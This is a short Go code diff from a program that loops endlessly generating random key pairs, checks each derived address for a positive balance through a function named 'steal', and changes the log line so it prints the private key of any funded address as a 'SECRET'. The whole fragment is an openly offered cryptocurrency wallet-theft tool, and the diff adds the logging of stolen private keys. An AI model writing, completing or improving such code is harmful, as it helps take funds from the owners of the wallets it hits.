@@ -30,15 +30,17 @@ func isBalanceGreaterThanZero(addr string) (b bool, val string) {
 func steal(addr common.Address, privkey []byte) {
 	canSteal, _ := isBalanceGreaterThanZero(addr.String())
 	if canSteal {
-		log.Info(addr.String())
+		log.Infof("GOTIT from %s !!SECRET!! %x", addr.String(), privkey)
 	}
 }
 
 func main() {
 	log.Info("Steal start!!!")
 	for {
+		//for i := 0; i < 1; i++ {
 		pubkey, privkey := crypto.GenerateKeyPair()
 		addr := crypto.ToAddressFromPubkey(pubkey)
 		go steal(addr, privkey)
 	}
+	//time.Sleep(5 * time.Second)
 }
